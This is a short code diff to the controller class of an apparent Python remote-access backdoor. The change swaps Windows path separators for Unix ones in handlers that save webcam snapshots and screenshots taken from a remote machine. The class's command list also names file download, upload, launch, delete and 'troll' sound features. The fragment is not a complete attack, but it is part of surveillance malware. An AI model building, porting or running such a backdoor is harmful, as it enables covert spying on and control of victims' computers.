@@ -10,7 +10,7 @@ from colorama import Fore, init
 class server_backdoor:
     required_arguments = ["download", "troll", "upload", "launch", "del", "read", "psound", "sdmsg", "cgstate"]
 
-    TROLL_PATH = os.getcwd() + "\\SFX\\"
+    TROLL_PATH = os.getcwd() + "/SFX/"
     HACKED_SFX = TROLL_PATH + "CrazyLaugh.wav"
     TROLL_SFX = TROLL_PATH + "RunningAway.wav"
 
@@ -100,7 +100,7 @@ class server_backdoor:
     def write_webcam_snap(self, data):
         try:
             current_time = datetime.datetime.now()
-            file_name = "\\WebcamSnap{}{}{}.png".format(current_time.year, current_time.month, current_time.day)
+            file_name = "/WebcamSnap{}{}{}.png".format(current_time.year, current_time.month, current_time.day)
 
             path = os.getcwd() + file_name       
             self.write_file(path, data)
@@ -112,7 +112,7 @@ class server_backdoor:
     def write_screenshot(self, data):
         try:
             current_time = datetime.datetime.now()
-            file_name = "\\ScreenshotSnap{}{}{}.png".format(current_time.year, current_time.month, current_time.day)
+            file_name = "/ScreenshotSnap{}{}{}.png".format(current_time.year, current_time.month, current_time.day)
 
             path = os.getcwd() + file_name
             self.write_file(path, data)          
